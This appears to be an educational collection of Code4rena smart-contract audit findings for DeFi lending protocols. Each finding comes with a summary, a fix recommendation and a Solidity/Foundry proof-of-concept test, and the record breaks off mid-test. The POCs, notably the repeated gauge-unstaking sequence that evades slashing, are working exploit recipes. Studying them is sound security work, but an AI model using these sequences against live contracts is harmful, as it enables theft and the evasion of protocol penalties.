# ETAAcademy-Adudit: 1. Bond

<table>
  <tr>
    <th>title</th>
    <th>tags</th>
  </tr>
  <tr>
    <td>01. Bond</td>
    <td>
      <table>
        <tr>
          <th>audit</th>
          <th>basic</th>
          <th>DeFi</th>
          <td>bond</td>
        </tr>
      </table>
    </td>
  </tr>
</table>

[Github](https://github.com/ETAAcademy)｜[Twitter](https://twitter.com/ETAAcademy)｜[ETA-Audit](https://github.com/ETAAcademy/ETAAcademy-Audit)

Authors: [Eta](https://twitter.com/pwhattie), looking forward to your joining

## 1.[Medium] LendingTerm.sol `_partialRepay()` A user cannot partial repay a loan with 0 interest

### Partial repay zero interest

- Summary: The problem arises from a requirement in the code that checks if `interestRepaid != 0`. This condition, meant to prevent small repayments, creates an issue when the loan has zero interest, making partial repayment impossible despite being feasible through `_repay()`.

- Impact & Recommendation: A possible solution would be to remove the `interestRepaid != 0` from the require in `_partialRepay()` .
  <br> 🐬: [Source](https://code4rena.com/reports/2023-12-ethereumcreditguild#m-14-lendingtermsol-_partialrepay-a-user-cannot-partial-repay-a-loan-with-0-interest) & [Report](https://code4rena.com/reports/2023-12-ethereumcreditguild)

  <details><summary>POC</summary>

  ```solidity
      function testPartialRepayWithZeroInterestFail() public {
        LendingTerm term2 = LendingTerm(
            Clones.clone(address(new LendingTerm()))
        );
        term2.initialize(
            address(core),
            term.getReferences(),
            LendingTerm.LendingTermParams({
                collateralToken: address(collateral),
                maxDebtPerCollateralToken: _CREDIT_PER_COLLATERAL_TOKEN,
                interestRate: 0,
                maxDelayBetweenPartialRepay: _MAX_DELAY_BETWEEN_PARTIAL_REPAY,
                minPartialRepayPercent: _MIN_PARTIAL_REPAY_PERCENT,
                openingFee: 0,
                hardCap: _HARDCAP
            })
        );
        vm.label(address(term2), "term2");
        guild.addGauge(1, address(term2));
        guild.decrementGauge(address(term), _HARDCAP);
        guild.incrementGauge(address(term2), _HARDCAP);
        vm.startPrank(governor);
        core.grantRole(CoreRoles.RATE_LIMITED_CREDIT_MINTER, address(term2));
        core.grantRole(CoreRoles.GAUGE_PNL_NOTIFIER, address(term2));
        vm.stopPrank();
        // prepare & borrow
        uint256 borrowAmount = 20_000e18;
        uint256 collateralAmount = 12e18;
        collateral.mint(address(this), collateralAmount);
        collateral.approve(address(term2), collateralAmount);
        bytes32 loanId = term2.borrow(borrowAmount, collateralAmount);
        assertEq(term2.getLoan(loanId).collateralAmount, collateralAmount);
        vm.warp(block.timestamp + 10);
        vm.roll(block.number + 1);

        // check that the loan amount is the same as the initial borrow amount to ensure there are no accumulated interest
        assertEq(term2.getLoanDebt(loanId), 20_000e18);
        credit.mint(address(this), 10_000e18);
        credit.approve(address(term2), 10_000e18);
        vm.expectRevert("LendingTerm: repay too small");
        term2.partialRepay(loanId, 10_000e18);
    }

  ```

  </details>

## 2.[Medium] Over 90% of the Guild staked in a gauge can be unstaked, despite the gauge utilizing its full debt allocation

### Manipulate the gauge's debt allocation by tolerance

- Summary: The mentioned protocol utilizes a tolerance factor to extend a gauge's debt ceiling by 20%. By exploiting this tolerance, it becomes possible to manipulate the gauge's debt allocation. Specifically, if a gauge's debt allocation is at 100%, it's feasible to decrease the gaugeWeight by a specific amount. After applying the tolerance, the gauge's debt allocation remains unchanged. This manipulation allows unstaking approximately 16.6666% of the totalWeight at a time, given the current operational state.

- Impact: By repetitively exploiting this vulnerability, it's possible to unstake over 90% of the total staked Guild from the gauge, effectively evading potential slashing penalties. Before adjusting the gaugeWeight, an initial check can be implemented to determine if the gauge is already utilizing its full debt allocation. If it is, any attempt to unstake Guild should be prevented to avoid potential issues.
  <br> 🐬: [Source](https://code4rena.com/reports/2023-12-ethereumcreditguild#m-19-over-90-of-the-guild-staked-in-a-gauge-can-be-unstaked-despite-the-gauge-utilizing-its-full-debt-allocation) & [Report](https://code4rena.com/reports/2023-12-ethereumcreditguild)

  <details><summary>POC</summary>

  ```solidity
    // SPDX-License-Identifier: GPL-3.0-or-later
    pragma solidity 0.8.13;
    import {Clones} from "@openzeppelin/contracts/proxy/Clones.sol";
    import {Test} from "@forge-std/Test.sol";
    import {Core} from "@src/core/Core.sol";
    import {CoreRoles} from "@src/core/CoreRoles.sol";
    import {MockERC20} from "@test/mock/MockERC20.sol";
    import {SimplePSM} from "@src/loan/SimplePSM.sol";
    import {GuildToken} from "@src/tokens/GuildToken.sol";
    import {CreditToken} from "@src/tokens/CreditToken.sol";
    import {LendingTerm} from "@src/loan/LendingTerm.sol";
    import {AuctionHouse} from "@src/loan/AuctionHouse.sol";
    import {ProfitManager} from "@src/governance/ProfitManager.sol";
    import {RateLimitedMinter} from "@src/rate-limits/RateLimitedMinter.sol";
    contract UnstakeAtDebtCeiling is Test {
        address private governor = address(1);
        address private guardian = address(2);
        address user = address(0x01010101);
        address borrower = address(0x02020202);
        address lender = address(0x03030303);
        Core private core;
        ProfitManager private profitManager;
        CreditToken credit;
        GuildToken guild;
        MockERC20 collateral;
        MockERC20 pegToken;
        SimplePSM private psm;
        RateLimitedMinter rlcm;
        AuctionHouse auctionHouse;
        LendingTerm term;
        // LendingTerm params (same as deployment script)
        uint256 constant _CREDIT_PER_COLLATERAL_TOKEN = 1e18; // 1:1
        uint256 constant _INTEREST_RATE = 0.04e18; // 4% APR
        uint256 constant _MAX_DELAY_BETWEEN_PARTIAL_REPAY = 0;
        uint256 constant _MIN_PARTIAL_REPAY_PERCENT = 0;
        uint256 constant _HARDCAP = 2_000_000e18; // 2 million
        uint256 public issuance = 0;
        function setUp() public {
            vm.warp(1679067867);
            vm.roll(16848497);
            core = new Core();
            profitManager = new ProfitManager(address(core));
            collateral = new MockERC20();
            pegToken = new MockERC20(); // 18 decimals for easy calculations (deployment script uses USDC which has 6 decimals)
            credit = new CreditToken(address(core), "name", "symbol");
            guild = new GuildToken(
                address(core),
                address(profitManager)
            );
            rlcm = new RateLimitedMinter(
                address(core) /*_core*/,
                address(credit) /*_token*/,
                CoreRoles.RATE_LIMITED_CREDIT_MINTER /*_role*/,
                0 /*_maxRateLimitPerSecond*/,
                0 /*_rateLimitPerSecond*/,
                uint128(_HARDCAP) /*_bufferCap*/
            );
            auctionHouse = new AuctionHouse(address(core), 650, 1800);
            term = LendingTerm(Clones.clone(address(new LendingTerm())));
            term.initialize(
                address(core),
                LendingTerm.LendingTermReferences({
                    profitManager: address(profitManager),
                    guildToken: address(guild),
                    auctionHouse: address(auctionHouse),
                    creditMinter: address(rlcm),
                    creditToken: address(credit)
                }),
                LendingTerm.LendingTermParams({
                    collateralToken: address(collateral),
                    maxDebtPerCollateralToken: _CREDIT_PER_COLLATERAL_TOKEN,
                    interestRate: _INTEREST_RATE,
                    maxDelayBetweenPartialRepay: _MAX_DELAY_BETWEEN_PARTIAL_REPAY,
                    minPartialRepayPercent: _MIN_PARTIAL_REPAY_PERCENT,
                    openingFee: 0,
                    hardCap: _HARDCAP
                })
            );
            psm = new SimplePSM(
                address(core),
                address(profitManager),
                address(credit),
                address(pegToken)
            );
            profitManager.initializeReferences(address(credit), address(guild), address(psm));
            // roles
            core.grantRole(CoreRoles.GOVERNOR, governor);
            core.grantRole(CoreRoles.GUARDIAN, guardian);
            core.grantRole(CoreRoles.CREDIT_MINTER, address(this));
            core.grantRole(CoreRoles.GUILD_MINTER, address(this));
            core.grantRole(CoreRoles.GAUGE_ADD, address(this));
            core.grantRole(CoreRoles.GAUGE_PARAMETERS, address(this));
            core.grantRole(CoreRoles.CREDIT_MINTER, address(rlcm));
            core.grantRole(CoreRoles.RATE_LIMITED_CREDIT_MINTER, address(term));
            core.grantRole(CoreRoles.CREDIT_MINTER, address(psm));
            core.renounceRole(CoreRoles.GOVERNOR, address(this));
            // add gauge
            guild.setMaxGauges(10);
            guild.addGauge(1, address(term));
        }
        function testUnstakeAtFullDebtAllocation() public {
            // verify initial state
            LendingTerm.LendingTermParams memory params = term.getParameters();
            assertEq(params.hardCap, _HARDCAP);
            assertEq(term.issuance(), 0);
            assertEq(credit.totalSupply(), 0);
            assertEq(psm.redeemableCredit(), 0);
            assertEq(guild.getGaugeWeight(address(term)), 0);
            assertEq(rlcm.buffer(), _HARDCAP);
            // 2 million GUILD is staked into term
            guild.mint(user, _HARDCAP);
            vm.startPrank(user);
            guild.incrementGauge(address(term), _HARDCAP);
            vm.stopPrank();
            assertEq(guild.getGaugeWeight(address(term)), _HARDCAP);
            assertEq(guild.getUserWeight(user), _HARDCAP);
            // 2 million CREDIT is borrowed from term
            uint256 borrowAmount = _HARDCAP;
            uint256 collateralAmount = _HARDCAP;
            collateral.mint(borrower, collateralAmount);
            vm.startPrank(borrower);
            collateral.approve(address(term), collateralAmount);
            term.borrow(borrowAmount, collateralAmount);
            vm.stopPrank();
            assertEq(term.issuance(), _HARDCAP);
            assertEq(rlcm.buffer(), 0);
            assertEq(credit.totalSupply(), _HARDCAP);
            // 2 million CREDIT is minted from PSM
            pegToken.mint(lender, _HARDCAP);
            vm.startPrank(lender);
            pegToken.approve(address(psm), _HARDCAP);
            psm.mint(lender, _HARDCAP);
            vm.stopPrank();
            assertEq(credit.totalSupply(), _HARDCAP * 2);
            assertEq(psm.redeemableCredit(), _HARDCAP);
            // all 2 million loaned CREDIT gets redeemed in PSM by borrowers
            vm.startPrank(borrower);
            credit.approve(address(psm), _HARDCAP);
            psm.redeem(borrower, _HARDCAP);
            vm.stopPrank();
            assertEq(credit.totalSupply(), _HARDCAP);
            assertEq(psm.redeemableCredit(), 0);
            // verify state
            assertEq(collateral.balanceOf(address(term)), _HARDCAP);
            assertEq(credit.balanceOf(borrower), 0);
            assertEq(credit.balanceOf(lender), _HARDCAP);
            assertEq(credit.totalSupply(), _HARDCAP);
            assertEq(term.issuance(), _HARDCAP);
            assertEq(psm.redeemableCredit(), 0);
            assertEq(rlcm.buffer(), 0);
            assertEq(guild.getGaugeWeight(address(term)), _HARDCAP);
            assertEq(guild.totalWeight(), _HARDCAP);
            assertEq(guild.getUserWeight(user), _HARDCAP);
            assertEq(profitManager.gaugeWeightTolerance(), 1.2e18);
            // user tries to unstake various amounts at debtCeiling, but correctly fails
            vm.startPrank(user);
            vm.expectRevert("GuildToken: debt ceiling used");
            guild.decrementGauge(address(term), _HARDCAP);
            vm.expectRevert("GuildToken: debt ceiling used");
            guild.decrementGauge(address(term), 500_000e18);
            vm.expectRevert("GuildToken: debt ceiling used");
            guild.decrementGauge(address(term), 100e18);
            vm.stopPrank();
            // user successfully unstakes ~16.66%, despite term being at full debt allocation
            uint256 totalUnstaked;
            uint256 correction;
            uint256 unstakeAmount = 333333333333333333333333;

            emit log_named_uint("Gauge Weight before unstake", guild.getGaugeWeight(address(term)));
            vm.startPrank(user);
            guild.decrementGauge(address(term), unstakeAmount);
            vm.stopPrank();
            totalUnstaked += unstakeAmount;

            emit log_named_uint("Gauge Weight after 1st unstake", guild.getGaugeWeight(address(term)));
            verifyState(0, totalUnstaked);

            // user successfully unstakes another ~16.66%
            correction += 1;
            unstakeAmount = 277777777777777777777778;
            vm.startPrank(user);
            guild.incrementGauge(address(term), correction); // to handle rounding issues
            guild.decrementGauge(address(term), unstakeAmount);
            vm.stopPrank();
            totalUnstaked += unstakeAmount;
            emit log_named_uint("Gauge Weight after 2nd unstake", guild.getGaugeWeight(address(term)));
            verifyState(correction, totalUnstaked);
            // user successfully unstakes another ~16.66%
            unstakeAmount = 231481481481481481481481;

            vm.startPrank(user);
            guild.decrementGauge(address(term), unstakeAmount);
            vm.stopPrank();
            totalUnstaked += unstakeAmount;
            emit log_named_uint("Gauge Weight after 3rd unstake", guild.getGaugeWeight(address(term)));
            verifyState(correction, totalUnstaked);
            // user successfully unstakes another ~16.66%
            unstakeAmount = 192901234567901234567901;
            vm.startPrank(user);
            guild.decrementGauge(address(term), unstakeAmount);
            vm.stopPrank();
            totalUnstaked += unstakeAmount;
            emit log_named_uint("Gauge Weight after 4th unstake", guild.getGaugeWeight(address(term)));
            verifyState(correction, totalUnstaked);
            // user successfully unstakes another ~16.66%
            correction += 5493827160493827160492; // to make calculations easier
            unstakeAmount = 161666666666666666666666;
            vm.startPrank(user);
            guild.incrementGauge(address(term), 5493827160493827160492);
            guild.decrementGauge(address(term), unstakeAmount);
            vm.stopPrank();
            totalUnstaked += unstakeAmount;
            emit log_named_uint("Gauge Weight after 5th unstake", guild.getGaugeWeight(address(term)));
            verifyState(correction, totalUnstaked);
            // user successfully unstakes another ~16.66%
            unstakeAmount = 134722222222222222222222;
            vm.startPrank(user);
            guild.decrementGauge(address(term), unstakeAmount);
            vm.stopPrank();
            totalUnstaked += unstakeAmount;
            emit log_named_uint("Gauge Weight after 6th unstake", guild.getGaugeWeight(address(term)));
            verifyState(correction, totalUnstaked);
            // user successfully unstakes another ~16.66%
            unstakeAmount = 112268518518518518518518;
            vm.startPrank(user);
            guild.decrementGauge(address(term), unstakeAmount);
            vm.stopPrank();
            totalUnstaked += unstakeAmount;
            emit log_named_uint("Gauge Weight after 7th unstake", guild.getGaugeWeight(address(term)));
            verifyState(correction, totalUnstaked);
            // user successfully unstakes another ~16.66%
            unstakeAmount = 93557098765432098765432;
            vm.startPrank(user);
            guild.decrementGauge(address(term), unstakeAmount);
            vm.stopPrank();
            totalUnstaked += unstakeAmount;
            emit log_named_uint("Gauge Weight after 8th unstake", guild.getGaugeWeight(address(term)));
            verifyState(correction, totalUnstaked);
            // user successfully unstakes another ~16.66%
            correction += 103395061728395061726; // to make calculations easier
            unstakeAmount = 77981481481481481481481;
            vm.startPrank(user);
            guild.incrementGauge(address(term), 103395061728395061726);
            guild.decrementGauge(address(term), unstakeAmount);
            vm.stopPrank();
            totalUnstaked += unstakeAmount;
            emit log_named_uint("Gauge Weight after 9th unstake", guild.getGaugeWeight(address(term)));
            verifyState(correction, totalUnstaked);
            // user successfully unstakes another ~16.66%
            unstakeAmount = 64984567901234567901234;
            vm.startPrank(user);
            guild.decrementGauge(address(term), unstakeAmount);
            vm.stopPrank();
            totalUnstaked += unstakeAmount;
            emit log_named_uint("Gauge Weight after 10th unstake", guild.getGaugeWeight(address(term)));
            verifyState(correction, totalUnstaked);
            // user successfully unstakes another ~16.66%
            correction += 160493827160493827; // to make calculations easier
            unstakeAmount = 54153833333333333333333;
            vm.startPrank(user);
            guild.incrementGauge(address(term), 160493827160493827);
            guild.decrementGauge(address(term), unstakeAmount);
            vm.stopPrank();
            totalUnstaked += unstakeAmount;
            emit log_named_uint("Gauge Weight after 11th unstake", guild.getGaugeWeight(address(term)));
            verifyState(correction, totalUnstaked);
            // user successfully unstakes another ~16.66%
            unstakeAmount = 45128194444444444444444;
            vm.startPrank(user);
            guild.decrementGauge(address(term), unstakeAmount);
            vm.stopPrank();
            totalUnstaked += unstakeAmount;
            emit log_named_uint("Gauge Weight after 12th unstake", guild.getGaugeWeight(address(term)));
            verifyState(correction, totalUnstaked);
            // user successfully unstakes another ~16.66%
            correction += 1;
            unstakeAmount = 37606828703703703703704;
            vm.startPrank(user);
            guild.incrementGauge(address(term), 1);
            guild.decrementGauge(address(term), unstakeAmount);
            vm.stopPrank();
            totalUnstaked += unstakeAmount;
            emit log_named_uint("Gauge Weight after 13th unstake", guild.getGaugeWeight(address(term)));
            verifyState(correction, totalUnstaked);
            emit log_named_uint("Number of GUILD user has unstaked so far", totalUnstaked);
            // user can keep performing these calculations to unstake more GUILD
            // calculations occurring in `LendingTerm::debtCeiling`:
            // uint256 totalWeight = guild.totalTypeWeight(1);
            // uint256 gaugeWeight = totalWeight - unstakeAmount;
            // uint256 tolerance = profitManager.gaugeWeightTolerance(); // 1.2e18
            // uint256 toleratedGaugeWeight = (gaugeWeight * tolerance) / 1e18; // totalWeight
            // uint256 debtCeilingBefore = (totalBorrowedCredit * toleratedGaugeWeight) / totalWeight; // 2_000_000e18
            // ideal unstakeAmount ~= totalWeight + ((totalBorrowedCredit * totalWeight) / tolerance) *with a lot of precision*
            // a.k.a totalWeight * .16666... *high high precision*
            // the goal is to make `toleratedGaugeWeight == totalWeight`, assuming that totalBorrowedCredit == issuance
        }
        function verifyState(uint256 correction, uint256 unstaked) internal {
            // verify state
            assertEq(credit.totalSupply(), _HARDCAP);
            assertEq(term.issuance(), _HARDCAP); // issuance is at hardCap/debtCeiling
            assertEq(psm.redeemableCredit(), 0);
            assertEq(rlcm.buffer(), 0); // global debtCeiling hit
            assertEq(guild.getGaugeWeight(address(term)), _HARDCAP + correction - unstaked);
            assertEq(guild.totalWeight(), _HARDCAP + correction - unstaked);
            assertEq(guild.getUserWeight(user), _HARDCAP + correction - unstaked);
        }
    }

  ```

  </detail>

## 3.[Medium] LendingTerm inconsistency between debt ceiling as calculated in borrow() and debtCeiling()

### DebtCeiling calculation

- Summary: There's a discrepancy in debtCeiling calculation between the borrow() and debtCeiling() functions in the LendingTerm contract. This inconsistency not only causes operational differences but also affects liquidity utilization. The borrow() function calculates a more restrictive debtCeiling, leading to underutilized liquidity compared to the debtCeiling() function.

- Impact & Recommendation: Unify the debtCeiling calculation method across the protocol to avoid lost income opportunities for lenders due to unused liquidity not generating interest
  <br> 🐬: [Source](https://code4rena.com/reports/2023-12-ethereumcreditguild#m-22-lendingterm-inconsistency-between-debt-ceiling-as-calculated-in-borrow-and-debtceiling) & [Report](https://code4rena.com/reports/2023-12-ethereumcreditguild)

  <details><summary>POC</summary>

  - `borrow()` function calculates the `debtCeiling` using a simpler formula:

    - debtCeiling = $\frac{(Gauge Weight × (Total Borrowed Credit + Borrow Amount))}{Total Weight} × Gauge Weight Tolerance$

  - `debtCeiling()` function's calculation method is more complex:
    - debtCeiling = $(((\frac{Total BorrowedCredit × (Gauge Weight × 1.2e18)}{Total Weight}) - Issuance) × \frac{Total Weight}{Other Cauges Weight}) + Issuance$

  </details>

## 4.[Medium] ProfitManager’s creditMultiplier calculation does not count undistributed rewards; this can cause value losses to users

### CreditMultiplier calculation consider undistributed rewards

- Summary: The ProfitManager's creditMultiplier calculation doesn't consider undistributed rewards, leading to potential losses for users. When losses occur, excess amounts are attributed to credit token holders by slashing the creditMultiplier, `newCreditMultiplier = (creditMultiplier *  (creditTotalSupply - loss)) / creditTotalSupply;` . However, using totalSupply() can be problematic if a significant portion of the supply is in undistributed rewards, resulting in higher-than-necessary creditMultiplier slashing.

- Impact & Recommendation: CreditMultiplier slashing is higher than necessary due to incorrect accounting, penalizing credit token holders and locking value in the protocol. Consider using targetTotalSupply() instead of totalSupply() to rectify this issue.
  <br> 🐬: [Source]([M-24] ProfitManager’s creditMultiplier calculation does not count undistributed rewards; this can cause value losses to users) & [Report](https://code4rena.com/reports/2023-12-ethereumcreditguild)

  <details><summary>POC</summary>

  ```solidity

      function testH2() external {
        uint ts = block.timestamp;
        // Set ProfitManager to 100% rewards for rebasing users
        pm.setProfitSharingConfig(
            0,          // surplusBufferSplit,
            1e18,       // creditSplit,
            0,          // guildSplit,
            0,          // otherSplit,
            address(0)  // otherRecipient
        );

        // User 1 deposit 3000 USDC in PSM, gets 3000 gUSDC, enters rebase
        address user1 = address(1);
        vm.startPrank(user1);
        coll.mint(user1, 3_000e18);
        coll.approve(address(sPsm), 3_000e18);
        sPsm.mintAndEnterRebase(3_000e18);
        // User 2 open Loan A, 1000 gUSDC, redeems for 1000 USDC
        address user2 = address(2);
        vm.startPrank(user2);
        coll.mint(user2, 1_000e18);
        coll.approve(address(lt), 1_000e18);
        bytes32 loanA = lt.borrow(1_000e18, 1_000e18);
        ct.approve(address(sPsm), 1_000e18);
        sPsm.redeem(user2, 1_000e18);
        // User 3 open Loan B, 1000 gUSDC, redeems for 1000 USDC
        address user3 = address(3);
        vm.startPrank(user3);
        coll.mint(user3, 1_000e18);
        coll.approve(address(lt), 1_000e18);
        bytes32 loanB = lt.borrow(1_000e18, 1_000e18);
        ct.approve(address(sPsm), 1_000e18);
        sPsm.redeem(user3, 1_000e18);
        // User 4 open Loan C, 1000 gUSDC, redeems for 1000 USDC
        address user4 = address(4);
        vm.startPrank(user4);
        coll.mint(user4, 1_000e18);
        coll.approve(address(lt), 1_000e18);
        bytes32 loanC = lt.borrow(1_000e18, 1_000e18);
        ct.approve(address(sPsm), 1_000e18);
        sPsm.redeem(user4, 1_000e18);
        // Time passes, all loans accrue 50% interest, loan B gets called
        ts += lt.YEAR() - 3 weeks;
        vm.warp(ts);
        lt.call(loanB);
        ts += 3 weeks;
        vm.warp(ts);
        // User 2 deposit 1500 USDC in PSM, gets 1500 gUSDC, and repay Loan A (500 profit) -> 1500 USDC in PSM
        vm.startPrank(user2);
        coll.mint(user2, 500e18);
        coll.approve(address(sPsm), 1500e18);
        sPsm.mint(user2, 1500e18);
        ct.approve(address(lt), 1500e18);
        lt.repay(loanA);
        // Now User 1's 3000 gUSDC balance is interpolating towards 3500 gUSDC
        assertEq(3_000e18, ct.totalSupply());
        assertEq(ct.totalSupply(), ct.balanceOf(user1));
        assertEq(3_500e18, ct.targetTotalSupply());
        // ---  Everything good till here; now we get to the bug:
        // User 3 completely defaults on Loan B, 1000 gUSDC loss is reported,
        // creditMultiplier becomes 1e18 * (3000 - 1000) / 3000 = 0.6667e18
        // 🚨 if targetTotalSupply was used, this would be 1e18 * (3500 - 1000) / 3500 = 0.714285e18
        ah.forgive(loanB);
        assertApproxEqRel(pm.creditMultiplier(), 0.6667e18, 0.0001e18 /* 0.01% */);
        // User 4's Loan C now owes 1500 / 0.66667 = 2250 gUSDC
        uint loanCdebt = lt.getLoanDebt(loanC);
        assertApproxEqRel(loanCdebt, 2250e18, 0.0001e18 /* 0.01% */);
        // User 4 deposit 1500 USDC in PSM, gets 2250 gUSDC, and repay Loan C (750 profit) -> 3000 USDC in PSM
        vm.startPrank(user4);
        coll.mint(user4, 500e18);
        coll.approve(address(sPsm), 1500e18);
        sPsm.mint(user4, 1500e18);
        ct.approve(address(lt), loanCdebt);
        lt.repay(loanC);

        // Now User 1's 3000 gUSDC balance is interpolating towards 4250
        assertEq(3_000e18, ct.totalSupply());
        assertEq(ct.totalSupply(), ct.balanceOf(user1));
        assertApproxEqRel(4_250e18, ct.targetTotalSupply(), 0.0001e18 /* 0.01% */);
        // User 1 waits for the interpolation to end
        ts += ct.DISTRIBUTION_PERIOD();
        vm.warp(ts);
        // User 1 redeems 4250 gUSDC for 4250 * 0.66667 = 2833 USDC -> 167 USDC in PSM (🚨 there should be no leftover)
        vm.startPrank(user1);
        ct.approve(address(sPsm), ct.balanceOf(user1));
        sPsm.redeem(user1, ct.balanceOf(user1));
        assertApproxEqRel(2833.3e18, coll.balanceOf(user1), 0.0001e18 /* 0.01% */);
        // 🚨 this value remains locked in the SimplePSM contract as a result of the incorrect accounting
        assertApproxEqRel(166.66e18, coll.balanceOf(address(sPsm)), 0.0001e18 /* 0.01% */);
        // ℹ️ if ProfitManager used targetTotalSupply, the value locked would be ~2e4 lost to rounding

  }

  ```

  </details>

## 5. [Medium] Unbond_instant removes incorrect amount of shares

### Removes shares without fees

- Summary: The problem lies in the `unbond_instant` function, where users can immediately unbond their shares but must pay a fee. However, a mistake in the code results in the fee not being considered when removing shares by `final_amount`, leaving some shares stuck in the system and continuing to accumulate rewards. This creates an unfair advantage for users who unbond instantly, as their shares still receive rewards while others cannot access them and one share no longer corresponds to one underlying token due to this issue.

- Impact & Recommendation: For the unbond_instant function, the code mistakenly uses the final_amount instead of change.change to remove shares.

<br> 🐬: [Source](https://code4rena.com/reports/2024-03-acala#m-03-unbond_instant-removes-incorrect-amount-of-shares) & [Report](https://code4rena.com/reports/2024-03-acala)

<details><summary>POC</summary>

```solidity

  + println!("change.change: {:?}", change.change);
  144: T::OnBonded::happened(&(who.clone(), change.change));
  145: Self::deposit_event(Event::Bonded {
  146: 	who,
  147: 	amount: change.change,
  148: });

  + println!("final_amount: {:?}", final_amount);
  196: T::OnUnbonded::happened(&(who.clone(), final_amount));
  197: Self::deposit_event(Event::InstantUnbonded {
  198: 	who,
  199: 	amount: final_amount,
  200: 	fee,
  201: });

```

</details>

## 6. [High] Incorrect bad debt accounting can lead to a state where the claimFeesBeneficial function is permanently bricked and no new incentives can be distributed, potentially locking pending and future protocol fees in the FeeManager contract

### Bad Debt & incentives

- Summary: Fees go to `FeeManager`, but incentives are only distributed if there's no global bad debt. Beneficials can claim fees, but not when there's bad debt. If a position undergoes multiple partial liquidations, each incrementing `totalBadDebtETH`, but only the most recent bad debt is recorded for the position, causing an imbalance. While paying back bad debt is possible, it's capped at the recorded amount for the position, leaving excess bad debt in totalBadDebtETH permanently. Thus, this bad debt can become permanent due to partial liquidations, blocking fee claims and incentive distributions.

- Impact & Recommendation: In `WiseSecurity::checkBadDebtLiquidation`, it's advisable to update totalBadDebtETH by the difference between the previous and new bad debt of a position, aligning with the logic in `FeeManagerHelper::_updateUserBadDebt`.
  <br> 🐬: [Source](https://code4rena.com/reports/2024-02-wise-lending#h-03-incorrect-bad-debt-accounting-can-lead-to-a-state-where-the-claimfeesbeneficial-function-is-permanently-bricked-and-no-new-incentives-can-be-distributed-potentially-locking-pending-and-future-protocol-fees-in-the-feemanager-contract) & [Report](https://code4rena.com/reports/2024-02-wise-lending)

  <details><summary>POC</summary>

  ```solidity
    // SPDX-License-Identifier: -- WISE --
    pragma solidity =0.8.24;
    import "./WiseLendingBaseDeployment.t.sol";
    contract BadDebtTest is BaseDeploymentTest {
        address borrower = address(0x01010101);
        address lender = address(0x02020202);
        uint256 depositAmountETH = 10e18; // 10 ether
        uint256 depositAmountToken = 10; // 10 ether
        uint256 borrowAmount = 5e18; // 5 ether
        uint256 nftIdLiquidator; // nftId of lender
        uint256 nftIdLiquidatee; // nftId of borrower
        uint256 debtShares;
        function _setupIndividualTest() internal override {
            _deployNewWiseLending(false);
            // set token value for simple calculations
            MOCK_CHAINLINK_2.setValue(1 ether); // 1 token == 1 ETH
            assertEq(MOCK_CHAINLINK_2.latestAnswer(), MOCK_CHAINLINK_ETH_ETH.latestAnswer());
            vm.stopPrank();

            // fund lender and borrower
            vm.deal(lender, depositAmountETH);
            deal(address(MOCK_WETH), lender, depositAmountETH);
            deal(address(MOCK_ERC20_2), borrower, depositAmountToken * 2);
        }
        function testScenario1() public {
            // --- scenario is set up --- //
            _setUpScenario();
            // --- shortfall event/crash creates bad debt, position partially liquidated logging bad debt --- //
            _marketCrashCreatesBadDebt();
            // --- borrower gets partially liquidated again --- //
            vm.prank(lender);
            LENDING_INSTANCE.liquidatePartiallyFromTokens(
                nftIdLiquidatee,
                nftIdLiquidator,
                address(MOCK_WETH),
                address(MOCK_ERC20_2),
                debtShares * 2e16 / 1e18
            );
            // --- global bad det increases again, but user bad debt is set to current bad debt created --- //
            uint256 newTotalBadDebt = FEE_MANAGER_INSTANCE.totalBadDebtETH();
            uint256 newUserBadDebt = FEE_MANAGER_INSTANCE.badDebtPosition(nftIdLiquidatee);

            assertGt(newUserBadDebt, 0); // userBadDebt reset to new bad debt, newUserBadDebt == current_bad_debt_created
            assertGt(newTotalBadDebt, newUserBadDebt); // global bad debt incremented again
            // newTotalBadDebt = old_global_bad_debt + current_bad_debt_created

            // --- user bad debt is paid off, but global bad is only partially paid off (remainder is fake debt) --- //
            _tryToPayBackGlobalDebt();
            // --- protocol fees can no longer be claimed since totalBadDebtETH will remain > 0 --- //
            vm.expectRevert(bytes4(keccak256("ExistingBadDebt()")));
            FEE_MANAGER_INSTANCE.claimFeesBeneficial(address(0), 0);
        }
        function testScenario2() public {
            // --- scenario is set up --- //
            _setUpScenario();
            // --- shortfall event/crash creates bad debt, position partially liquidated logging bad debt --- //
            _marketCrashCreatesBadDebt();

            // --- Position manipulated so second partial liquidation results in totalBorrow == bareCollateral --- //
            // borrower adds collateral
            vm.prank(borrower);
            LENDING_INSTANCE.solelyDeposit(
                nftIdLiquidatee,
                address(MOCK_ERC20_2),
                6
            );
            // borrower gets partially liquidated again
            vm.prank(lender);
            LENDING_INSTANCE.liquidatePartiallyFromTokens(
                nftIdLiquidatee,
                nftIdLiquidator,
                address(MOCK_WETH),
                address(MOCK_ERC20_2),
                debtShares * 2e16 / 1e18
            );

            uint256 collateral = SECURITY_INSTANCE.overallETHCollateralsBare(nftIdLiquidatee);
            uint256 debt = SECURITY_INSTANCE.overallETHBorrowBare(nftIdLiquidatee);
            assertEq(collateral, debt); // LTV == 100% exactly
            // --- global bad debt is unchanged, while user bad debt is reset to 0 --- //
            uint256 newTotalBadDebt = FEE_MANAGER_INSTANCE.totalBadDebtETH();
            uint256 newUserBadDebt = FEE_MANAGER_INSTANCE.badDebtPosition(nftIdLiquidatee);
            assertEq(newUserBadDebt, 0); // user bad debt reset to 0
            assertGt(newTotalBadDebt, 0); // global bad debt stays the same (fake debt)
            // --- attempts to pay back fake global debt result in a noop, totalBadDebtETH still > 0 --- //
            uint256 paybackShares = _tryToPayBackGlobalDebt();

            assertEq(LENDING_INSTANCE.userBorrowShares(nftIdLiquidatee, address(MOCK_WETH)), paybackShares); // no shares were paid back
            // --- protocol fees can no longer be claimed since totalBadDebtETH will remain > 0 --- //
            vm.expectRevert(bytes4(keccak256("ExistingBadDebt()")));
            FEE_MANAGER_INSTANCE.claimFeesBeneficial(address(0), 0);
        }
        function _setUpScenario() internal {
            // lender supplies ETH
            vm.startPrank(lender);
            nftIdLiquidator = POSITION_NFTS_INSTANCE.mintPosition();
            LENDING_INSTANCE.depositExactAmountETH{value: depositAmountETH}(nftIdLiquidator);
            vm.stopPrank();
            // borrower supplies collateral token and borrows ETH
            vm.startPrank(borrower);
            MOCK_ERC20_2.approve(address(LENDING_INSTANCE), depositAmountToken * 2);
            nftIdLiquidatee = POSITION_NFTS_INSTANCE.mintPosition();

            LENDING_INSTANCE.solelyDeposit( // supply collateral
                nftIdLiquidatee,
                address(MOCK_ERC20_2),
                depositAmountToken
            );
